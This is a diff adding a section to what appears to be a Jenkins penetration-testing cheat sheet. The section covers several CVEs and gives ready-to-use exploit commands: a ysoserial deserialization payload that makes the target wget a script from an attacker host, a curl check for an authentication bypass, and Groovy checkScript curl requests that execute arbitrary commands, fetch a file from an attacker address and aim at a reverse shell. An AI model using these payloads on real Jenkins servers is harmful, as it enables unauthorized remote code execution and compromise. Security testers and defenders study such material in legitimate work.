@@ -67,3 +67,68 @@ Then, you should always try to brute-force users because probably weak passwords
 ```bash
 msf> use auxiliary/scanner/http/jenkins_login
 ```
+=====================
+Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
+---------------------------------------------------------------------------
+Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
+Then RCE using [this script](./rce/jenkins_rce_cve-2015-8103_deser.py):
+
+```bash
+java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
+./jenkins_rce.py jenkins_ip jenkins_port payload.out
+```
+
+
+Authentication/ACL bypass (CVE-2018-1000861, Jenkins <2.150.1)
+--------------------------------------------------------------
+[Jenkins Advisory](https://jenkins.io/security/advisory/2018-12-05/)
+
+Details [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).
+
+If the Jenkins requests authentication but returns valid data using the following request, it is vulnerable:
+```bash
+curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
+```
+
+
+Metaprogramming RCE in Jenkins Plugins (CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002)
+---------------------------------------------------------------------------------------------
+[Jenkins Advisory](https://jenkins.io/security/advisory/2019-01-08)
+
+Original RCE vulnerability [here](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html), full exploit [here](https://github.com/petercunha/jenkins-rce).
+
+Alternative RCE with Overall/Read and Job/Configure permissions [here](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc).
+
+
+CheckScript RCE in Jenkins (CVE-2019-1003029, CVE-2019-1003030)
+---------------------------------------------------------------
+[Jenkins Advisory](https://jenkins.io/security/advisory/2019-03-06/), [Credits](https://twitter.com/webpentest).
+
+Check if a Jenkins instance is vulnerable (needs Overall/Read permissions) with some Groovy:
+```bash
+curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
+```
+
+Execute arbitraty bash commands:
+```bash
+curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt".execute()}}'
+```
+
+If you don't immediately get a reverse shell you can debug by throwing an exception:
+```bash
+curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'
+```
+
+Git plugin (<3.12.0) RCE in Jenkins (CVE-2019-10392)
+----------------------------------------------------
+[Jenkins Advisory](https://jenkins.io/security/advisory/2019-09-12/), [Credits](https://iwantmore.pizza/posts/cve-2019-10392.html).
+
+This one will only work is a user has the 'Jobs/Configure' rights in the security matrix so it's very specific.
+
+
+CorePlague (CVE-2023-27898, CVE-2023-27905)
+-------------------------------------------
+[Jenkins Advisory](https://www.jenkins.io/security/advisory/2023-03-08/), [Credits](https://blog.aquasec.com/jenkins-server-vulnerabilities)
+
+Note that this is only exploitable if using a *dedicated* and out-of-date [Update Center](https://www.jenkins.io/templates/updates/). Therefore most servers are not vulnerable.
+
